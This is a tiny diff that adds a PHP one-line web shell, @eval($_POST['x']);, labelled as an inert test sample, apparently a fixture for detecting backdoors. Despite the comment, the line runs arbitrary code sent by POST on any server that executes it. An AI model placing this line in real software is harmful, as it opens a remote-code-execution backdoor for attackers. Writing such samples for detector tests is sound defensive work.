@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE, not a working shell
+@eval($_POST['x']);
+
